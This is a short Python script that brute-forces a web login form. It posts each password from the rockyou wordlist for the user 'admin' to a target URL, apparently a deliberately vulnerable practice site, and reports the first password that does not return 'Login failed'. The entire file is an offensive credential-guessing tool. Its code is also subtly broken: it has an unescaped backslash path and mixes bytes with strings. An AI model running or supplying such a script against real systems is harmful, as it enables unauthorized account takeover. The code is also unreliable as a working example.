#!/usr/bin/env python

import requests
from tqdm import tqdm   

# import the target url method
target_url = "http://testhtml5.vulnweb.com/#/popular"
data_dict = {"username": "admin", "password": "", "Login": "submit"}

# response.content
access_denied = "Login failed"

# open the wordlist file and iterate through each word, stripping the words of whitespace chars
# once the password is found, it will be displayed and the program will terminate
wordlist = ("E:\DATA BACKUP\Ethical Hacking\Wordlists\rockyou.txt")

# count the number of words in this wordlist
num_words = len(list(open(wordlist, "rb")))

# print the total number of passwords
print("Total passwords to test:", num_words)

with open(wordlist, "rb") as wordlist:
    for word in tqdm(wordlist, total = num_words, unit = "word"):   
        pwd = word.strip()
        data_dict["password"] = pwd
        response = requests.post(target_url, data = data_dict)
        if access_denied not in response.content:
            print("[+] Found the password --> " + pwd)
            exit()

print("[!] Password not found. Try another wordlist")

